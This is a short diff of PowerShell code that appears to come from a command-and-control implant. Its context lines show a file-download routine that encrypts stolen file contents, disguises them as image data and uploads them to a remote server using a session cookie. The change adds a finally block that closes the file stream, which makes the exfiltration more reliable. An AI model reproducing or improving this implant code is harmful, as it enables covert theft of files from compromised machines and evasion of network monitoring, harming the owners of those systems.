@@ -486,7 +486,9 @@ function Download-File
         $send = Encrypt-String2 $key $output
         $UploadBytes = getimgdata $send
         (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
-    } 
+    } finally {
+        $fs.Close()
+    }
 }
 function Posh-Delete
 {
